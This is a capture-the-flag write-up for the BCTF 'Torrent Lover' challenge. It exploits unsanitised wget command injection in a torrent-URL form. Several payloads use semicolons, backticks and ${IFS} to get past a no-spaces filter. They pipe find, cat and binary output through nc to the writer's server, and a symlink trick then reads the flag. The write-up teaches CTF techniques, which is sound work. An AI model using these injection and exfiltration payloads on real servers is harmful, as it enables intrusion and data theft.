Torrent Lover
-------------

In this problem, we were given a website with a form and the instructions: "input something(torrent)'s URL u wanna know here". If you entered a link with a torrent file, the website would direct you to a page where you could view metadata about the torrent. The server performed some kind of validation on the url you gave it. Entering a url with a space, or aurl that didn't end in ".torrent" would give you an error message.

### Unsafe wget

First, I submitted a url that pointed to a torrentfile on a server I controlled. Looking at the user-agent in the request made, it was clear that the server was using the `wget` command to fetch my torrent file. If the server was in fact using wget to fetch the urls we provided, we could likely get it to execute arbitary commands. As a simple POC, I gave it this url:
```
http://<myserver>/`uname`.torrent
```
This caused the server to make a request to my server for `/Linux.torrent`.

We could also get the server to run other arbitrary commands by append a semicolon, followed by the command we wanted to run.

### Shellcode without spaces

The validation on the server caused our requests to fail if the url we supplied contained a space. No worries though, we can simply use the internal file separator to get around this restriction.

Giving it the url
```
http://<myserver>/somefile;echo${IFS}test|nc${IFS}<myserver>${IFS}9999;.torrent
```

And listening on my server:
```
nc -l 9999
```

Caused the game server to send me the word "test". This means we can run arbitrary commands on the server, and see the output.

### Find the flag

First things first, I used the `find` command to file the flag on the server
```
http://<myserver>/somefile;find${IFS}/${IFS}-name${IFS}*flag*|nc${IFS}<myserver>${IFS}9999;.torrent
```

This revealed that there were `flag` and `use_me_to_read_flag` files in /var/ww/html/flag

Running the binary by submitting this url
```
http://<myserver>;/var/www/flag/use_me_to_read_flag${IFS}/var/www/flag/flag|nc${IFS}<myserver>${IFS}9999;.torrent
```
I see a message that says: `You do not have permission to access /var/www/flag/flag` Using ls -al to inspect the permissions, it appears that
the binary does have the proper permissions to read the flag. We probably want to grab the binary and inspect it locally.

### A small bit of reverse engineering
Command to grab the binary:

```
http://<myserver>/;cat${IFS}/var/www/flag/use_me_to_read_flag|nc${IFS}<myserver>${IFS}9999;.torrent
```

And on my server:
```
nc -l 9999 > out.bin
```

Binary get!

Using `file`, I determine that it is an ELF. I run `ltrace` on it.

```
echo "test" > flag
ltrace out.bin flag
```

From the output, I can see that the binary does a `strstr` so see if the argument I provided contains the substring 'flag'.

So we can't directly read the flag, but that's no big deal. We can just make a symlink to the flag.

```
ln -s flag different_name
./out.bin different_name
```
It works! Now let's do that on the server. I submit the following two urls:

```
http://<myserver>/;/ln${IFS}-s${IFS}/var/www/flag/flag${IFS}/tmp/asdf;.torrent
```
and
```
http://<myserver>/;/var/www/flag/use_me_to_read_flag${IFS}/tmp/asdf|nc${IFS}<myserver>${IFS}9999;.torrent
```

And the server spits out the flag:
```
BCTF{Do_not_play_dota2_or_you_will_be_stupid_like_me233}
```


